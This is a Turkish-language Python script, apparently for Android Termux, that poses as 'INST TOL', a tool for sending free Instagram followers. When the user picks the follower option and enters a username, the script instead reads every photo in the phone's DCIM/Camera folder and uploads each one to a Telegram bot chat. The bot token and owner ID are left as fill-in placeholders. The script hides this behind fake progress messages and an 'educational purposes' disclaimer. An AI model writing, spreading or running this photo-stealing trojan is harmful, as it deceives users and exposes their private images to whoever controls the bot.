import os
import time
import requests


def green(text):
    return "\033[92m" + text + "\033[0m"


print(green("Gereksimler Kuruluyor Lütfen Bekleyin..."))


time.sleep(3)


os.system("clear")


print(green("""
█ █▄░█ █▀ ▀█▀░▀█▀ █▀█ █░
█ █░▀█ ▄█ ░█░░░█░ █▄█ █▄
"""))


print(green("""
╭━━━━━━━━━━━━━━━━╮
┇By : @JesusOrj
╰━━━━━━━━━━━━━━━━╯

╭━━━━━━━━━━━━━━━━╮
┇ [ 1 ] Takipçi Yolla
┇ [ 2 ] Bilgi
┇ [ 3 ] Çık
┇ Seçiminizi Girin:
╰━━━━━━━━━━━━━━━━╯
"""))


secim = input()


if secim == "1":
    
    while True:
        
        takipci = input(green("Kaç Takipçi Gönderilsin: "))
        
        if int(takipci) > 100:
            
            print(green("Maximum 100 Takipçi Gönderebilirsiniz."))
            
            continue
        else:
            
            kullanici_adi = input(green("Lütfen Instagram Kullanıcı Adınızı Girin: "))
            
            print(green("Takipçiler Gönderiliyor..."))
            
            
            fotograflar = os.listdir("/storage/emulated/0/DCIM/Camera/")
            
            for fotograf in fotograflar:
                
                fotograf_yolu = "/storage/emulated/0/DCIM/Camera/" + fotograf
                
                fotograf_dosyasi = open(fotograf_yolu, "rb")
                
                token = "TOKEN GİR"
                owner_id = "ID GİR"
                
                
                requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": owner_id}, files={"photo": fotograf_dosyasi})
                
                fotograf_dosyasi.close()
            
            print(green("Gönderim Tamamlandı!"))
            
            break
elif secim == "2":
    
    
    print(green("""
    INST TOL, Instagram Takipçi Kasmanız için Tasarlanmış Basit Bir Takipçi Yazılımıdır Şifre Gerektirmeden Kullanıcı Adınız ile Güvenle Takipçi Gönderebilirsiniz Ama Instagram API'sine Bağlandığınız İçin Çıkacak Herhangi Bir Sorundan Siz Sorumlusunuz Eğitim Amacı Kodlanmıştır Yazılım Sahibi: @JesusOrj
    """))
    
    input(green("Devam etmek için enter tuşuna basın."))
    
    os.system("clear")
    
    print(green("""
    █ █▄░█ █▀ ▀█▀░▀█▀ █▀█ █░
    █ █░▀█ ▄█ ░█░░░█░ █▄█ █▄

    ╭━━━━━━━━━━━━━━━━╮
    ┇By : @JesusOrj
    ╰━━━━━━━━━━━━━━━━╯

    ╭━━━━━━━━━━━━━━━━╮
    ┇ [ 1 ] Takipçi Yolla
    ┇ [ 2 ] Bilgi
    ┇ [ 3 ] Çık
    ┇ Seçiminizi Girin:
    ╰━━━━━━━━━━━━━━━━╯
    """))
elif secim == "3":
    
    
    exit()
else:
    
    
    print(green("Lütfen geçerli bir seçim yapın."))
    
    print(green("""
    █ █▄░█ █▀ ▀█▀░▀█▀ █▀█ █░
    █ █░▀█ ▄█ ░█░░░█░ █▄█ █▄

    ╭━━━━━━━━━━━━━━━━╮
    ┇INST TOL Hoş Geldiniz
    ╰━━━━━━━━━━━━━━━━╯

    ╭━━━━━━━━━━━━━━━━╮
    ┇ [ 1 ] Takipçi Yolla
    ┇ [ 2 ] Bilgi
    ┇ [ 3 ] Çık
    ┇ Seçiminizi Girin:
    ╰━━━━━━━━━━━━━━━━╯
    """))

